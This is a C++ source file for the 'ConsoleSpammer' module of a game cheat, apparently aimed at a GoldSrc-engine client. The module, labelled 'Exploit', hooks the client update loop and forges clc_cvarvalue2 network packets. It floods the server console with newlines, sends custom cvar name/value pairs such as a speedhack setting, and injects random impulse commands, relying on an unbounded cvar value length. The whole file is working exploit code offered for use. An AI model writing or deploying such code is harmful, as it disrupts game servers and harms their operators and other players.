#include "StdAfx.h"
#include "CConsoleSpammerModule.hpp"

CConsoleSpammerModule::CConsoleSpammerModule() : CModule("ConsoleSpammer", "Exploit") {
	m_pVecValues->push_back(m_pMode = Q_new(CListValue)("Mode", "sc_consolespammer_mode", "Newlines\0Custom\0Impulse\0\0", 1));

	m_pVecValues->push_back(m_pCustomCvarName = Q_new(CTextValue)("Custom mode - ConVar name", "sc_consolespammer_custom_cvar_name", "sc_speedhack_ltfx"));
	m_pVecValues->push_back(m_pCustomCvarValue = Q_new(CTextValue)("Custom mode - ConVar value", "sc_consolespammer_custom_cvar_value", "1000"));

	m_pVecValues->push_back(m_pRequestId = Q_new(CIntegerValue)("Newlines & Custom - Request id", "sc_consolespammer_req_id", INT_MIN, INT_MAX, 1337));

	m_pVecValues->push_back(m_pNewlinesAmount = Q_new(CIntegerValue)("Newlines mode - Amount", "sc_consolespammer_nl_amt", 0, 4096, 128));

	m_pVecValues->push_back(m_pSendInterval = Q_new(CFloatValue)("Newlines & Custom - Send interval", "sc_consolespammer_send_interval", 0.f, 1.f, 0.01f));

	m_pVecValues->push_back(m_pImpulseValue = Q_new(CIntegerValue)("Impulse - Impulse value", "sc_consolespammer_impulse_value", 1, UCHAR_MAX, 101));
	m_pVecValues->push_back(m_pRandomImpulse = Q_new(CBoolValue)("Impulse - Random impulse value", "sc_consolespammer_random_impulse_value", true));

	m_dblNextCmdSendTime = 0.0;

	m_pTrustedRandom = Q_new(CTrustedRandom)();
	m_pTrustedRandom->FeedRandWithTime(time(NULL));

	DefineConCmd("sc_lightning_consolespammer", CConsoleSpammerModule);
}

void CConsoleSpammerModule::OnEnable() {
	CModule::OnEnable();
	CCheat::GetCheat()->m_pEventBus->RegisterListener(this);

	m_dblNextCmdSendTime = 0.0;
}

void CConsoleSpammerModule::OnDisable() {
	m_dblNextCmdSendTime = 0.0;

	CCheat::GetCheat()->m_pEventBus->UnregisterListener(this);
	CModule::OnDisable();
}

void CConsoleSpammerModule::OnEvent(const ISimpleEvent* _Event) {
	if (_Event->GetType() == EEventType::kUpdateEvent) {
		const CUpdateEvent* e = static_cast<const CUpdateEvent*>(_Event);

		if (m_pMode->Get() == 2 /* Impulse */) {
			if (e->m_pCmd->impulse == 0) { //if we're not toggling flashlight, not spraying...
				if (!m_pRandomImpulse->Get()) {
					e->m_pCmd->impulse = min(max(1, m_pImpulseValue->Get()), 255);
				} else {
					e->m_pCmd->impulse = m_pTrustedRandom->Rand(1, UCHAR_MAX);
				}
			}
		}

		if (m_pMode->Get() == 0 /* Newlines */ || m_pMode->Get() == 1 /* Custom */) {
			if (!g_pdblClientTime) return;
			double dblTime = *g_pdblClientTime;
			if (m_dblNextCmdSendTime + (double)(m_pSendInterval->Get()) > dblTime) {
				return;
			}
			m_dblNextCmdSendTime = dblTime;

			unsigned char* pCommandNumber = indirect_cast<decltype(pCommandNumber)>(ORIG_SZ_GetSpace(g_pNetchanMessage, sizeof(decltype(*pCommandNumber))));
			*pCommandNumber = 11; //clc_cvarvalue2

			long* lplRequestId = indirect_cast<decltype(lplRequestId)>(ORIG_SZ_GetSpace(g_pNetchanMessage, sizeof(decltype(*lplRequestId))));
			*lplRequestId = (long)(m_pRequestId->Get());

			if (m_pMode->Get() == 0 /* Newlines */) {
				char* pRequestCvarName = indirect_cast<decltype(pRequestCvarName)>(ORIG_SZ_GetSpace(g_pNetchanMessage, 255 /* the maximum which clc_cvarvalue2 can send */));
				for (int idx = 0; idx < 255; idx++) {
					pRequestCvarName[idx] = '\n';
				}
				pRequestCvarName[255 - 1] = '\0';
				char* pRequestCvarValue = indirect_cast<decltype(pRequestCvarName)>(ORIG_SZ_GetSpace(g_pNetchanMessage, m_pNewlinesAmount->Get() /* for some very strange reason, the cvar value isn't limited in length at all */));
				for (int idx = 0; idx < m_pNewlinesAmount->Get(); idx++) {
					pRequestCvarValue[idx] = '\n';
				}
				pRequestCvarValue[m_pNewlinesAmount->Get() - 1] = '\0';

				return;
			}
			const char* pCvarName = m_pCustomCvarName->Get();
			functional_size_t iCvarNameSize = strlen(pCvarName);

			char* pRequestCvarName = indirect_cast<decltype(pRequestCvarName)>(ORIG_SZ_GetSpace(g_pNetchanMessage, iCvarNameSize + 1));
			strncpy_s(pRequestCvarName, iCvarNameSize + 1, pCvarName, iCvarNameSize);
			pRequestCvarName[iCvarNameSize] = '\0';

			const char* pCvarValue = m_pCustomCvarValue->Get();
			functional_size_t iCvarValueSize = strlen(pCvarValue);

			char* pRequestCvarValue = indirect_cast<decltype(pRequestCvarName)>(ORIG_SZ_GetSpace(g_pNetchanMessage, iCvarValueSize + 1));
			strncpy_s(pRequestCvarValue, iCvarValueSize + 1, pCvarValue, iCvarValueSize);
			pRequestCvarValue[iCvarValueSize] = '\0';
		}
	}
}